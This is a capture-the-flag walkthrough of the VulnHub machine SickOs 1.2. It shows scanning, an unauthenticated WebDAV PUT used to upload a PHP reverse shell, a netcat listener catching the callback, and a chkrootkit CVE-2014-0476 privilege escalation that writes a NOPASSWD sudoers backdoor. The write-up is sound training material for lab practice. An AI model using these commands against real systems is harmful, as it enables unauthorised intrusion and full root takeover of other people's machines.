# SickOs 1.2
[Link to vulnhub](https://www.vulnhub.com/entry/sickos-12,144/)

## Reconnaissance
I start with reconnaissance to find the target because it has been set to receive DHCP
```
nmap -sS -O 192.168.159.0/24
```
I found the target at **192.168.159.132**. Now I start enumerate services running on that host.

## Enumeration
```
root@BOEING:/kapi/vulnhub/sic0s1.2# nmap -A -T4 -p- 192.168.159.132

Starting Nmap 7.25BETA1 ( https://nmap.org ) at 2017-03-03 18:54 PST
Nmap scan report for 192.168.159.132
Host is up (0.00072s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 66:8c:c0:f2:85:7c:6c:c0:f6:ab:7d:48:04:81:c2:d4 (DSA)
|   2048 ba:86:f5:ee:cc:83:df:a6:3f:fd:c1:34:bb:7e:62:ab (RSA)
|_  256 a1:6c:fa:18:da:57:1d:33:2c:52:e4:ec:97:e2:9e:af (ECDSA)
80/tcp open  http    lighttpd 1.4.28
|_http-server-header: lighttpd/1.4.28
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:F8:2E:DB (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.1, Linux 3.16 - 3.19, Linux 3.2 - 4.4, Linux 4.4
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.72 ms 192.168.159.132

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 98.64 seconds
```
From the result of Nmap, I found that the target was running 3 services
* SSH running on tcp port 22
* HTTP running on tcp port 80

Dirb to 192.168.159.132
```
root@BOEING:/kapi/vulnhub/sic0s1.2# dirb http://192.168.159.132/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Mar  3 18:59:24 2017
URL_BASE: http://192.168.159.132/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.159.132/ ----
+ http://192.168.159.132/index.php (CODE:200|SIZE:163)                                                                                                                                  
==> DIRECTORY: http://192.168.159.132/test/                                                                                                                                             
                                                                                                                                                                                        
---- Entering directory: http://192.168.159.132/test/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Fri Mar  3 18:59:28 2017
DOWNLOADED: 4612 - FOUND: 1
```
I found directory listing on **/test** but there is nothings interesting.

I check for HTTP method OPTIONS on / and /test and I found that many HTTP methods allowed on /test
```
### Request
OPTIONS /test/ HTTP/1.1
Host: 192.168.159.132
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:51.0) Gecko/20100101 Firefox/51.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0


### Response
HTTP/1.1 200 OK
DAV: 1,2
MS-Author-Via: DAV
Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK
Allow: OPTIONS, GET, HEAD, POST
Content-Length: 0
Date: Sat, 04 Mar 2017 03:07:40 GMT
Server: lighttpd/1.4.28
```

## Exploitation
HTTP method PUT allowed with no authenticatio required. An attacker could upload web shell to /test using HTTP method PUT.
Again, I uploaded this [PHP reverse shell](http://pentestmonkey.net/tools/php-reverse-shell) from pentestmonkey.
```
root@BOEING:/kapi/vulnhub/sic0s1.2# curl --upload-file  php-reverse-shell.txt -v --url http://192.168.159.132/test/reverse_shell.php -0 --http1.0
*   Trying 192.168.159.132...
* Connected to 192.168.159.132 (192.168.159.132) port 80 (#0)
> PUT /test/reverse_shell.php HTTP/1.0
> Host: 192.168.159.132
> User-Agent: curl/7.50.1
> Accept: */*
> Content-Length: 5687
> 
* We are completely uploaded and fine
* HTTP 1.0, assume close after body
< HTTP/1.0 201 Created
< Content-Length: 0
< Connection: close
< Date: Sat, 04 Mar 2017 03:25:28 GMT
< Server: lighttpd/1.4.28
< 
* Closing connection 0
```

I started netcat listening server. 
```
nc -nvlp 443
```

I browse to the PHP file I uploaded and shell spawned.
```
root@BOEING:/kapi/vulnhub/sic0s1.2# nc -nvlp 443
listening on [any] 443 ...
connect to [192.168.159.3] from (UNKNOWN) [192.168.159.132] 40942
Linux ubuntu 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux
 19:35:28 up 43 min,  0 users,  load average: 0.02, 0.02, 0.05
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```
**I'd tried to listening on TCP port 8890 before and found that no connection come to my listener then I changed listening port to 443 and modified the php reverse shell before uploaded it again**

I executed Python to spawn a shell.
```
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@ubuntu:/$ 
```

## Escalation
I enumerated OS version.
```
www-data@ubuntu:/$ lsb_release -a
lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 12.04.4 LTS
Release:        12.04
Codename:       precise
www-data@ubuntu:/tmp$ dpkg -l | grep chkrootkit
dpkg -l | grep chkrootkit
rc  chkrootkit                      0.49-4ubuntu1.1                   rootkit detector
```
I checked for cron jobs and I found that cron.daily has **chkrootkit**. I knew a vulnerability of chkrootkit [CVE-2014-0476](https://www.exploit-db.com/exploits/33899/) this could allow me to escalate my privilge.

Vulnerable chkrootkit will execute /tmp/update and I could create file named update in /tmp contain shell command that add **sudo su** to user www-data

```
www-data@ubuntu:/tmp$ echo 'echo "www-data ALL=NOPASSWD: ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```
Wait for 3 hours...
```
www-data@ubuntu:/tmp$ sudo su
sudo su
root@ubuntu:/tmp# ls -al
ls -al
total 28
drwxrwxrwt  4 root     root     4096 Mar  3 21:12 .
drwxr-xr-x 22 root     root     4096 Mar 30  2016 ..
-rw-rw-rw-  1 www-data www-data  225 Mar  3 21:04 kapi.txt
srwxr-xr-x  1 www-data www-data    0 Mar  4  2017 php.socket-0
-rwxrwxrwx  1 www-data www-data   76 Mar  3 21:09 update
-rw-r--r--  1 root     root     1600 Mar  4  2017 vgauthsvclog.txt.0
drwxrwxrwt  2 root     root     4096 Mar  4  2017 VMwareDnD
drwx------  2 root     root     4096 Mar  4  2017 vmware-root
root@ubuntu:/tmp# whoami
whoami
root
```

## Find the flag
```
root@ubuntu:/tmp# cd /root
cd /root
root@ubuntu:~# ls -al
ls -al
total 76
drwx------  4 root root  4096 Apr 26  2016 .
drwxr-xr-x 22 root root  4096 Mar 30  2016 ..
-rw-r--r--  1 root root 39421 Apr  9  2015 304d840d52840689e0ab0af56d6d3a18-chkrootkit-0.49.tar.gz
-r--------  1 root root   491 Apr 26  2016 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
-rw-------  1 root root  3066 Apr 26  2016 .bash_history
-rw-r--r--  1 root root  3106 Apr 19  2012 .bashrc
drwx------  2 root root  4096 Apr 12  2016 .cache
drwxr-xr-x  2 john john  4096 Apr 12  2016 chkrootkit-0.49
-rw-r--r--  1 root root   541 Apr 25  2016 newRule
-rw-r--r--  1 root root   140 Apr 19  2012 .profile
root@ubuntu:~# cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
WoW! If you are viewing this, You have "Sucessfully!!" completed SickOs1.2, the challenge is more focused on elimination of tool in real scenarios where tools can be blocked during an assesment and thereby fooling tester(s), gathering more information about the target using different methods, though while developing many of the tools were limited/completely blocked, to get a feel of Old School and testing it manually.

Thanks for giving this try.

@vulnhub: Thanks for hosting this UP!.
```



### For other information
* [Reverse shell cheat sheet - pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
* [Basic privilege escalation - g0tmi1k](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
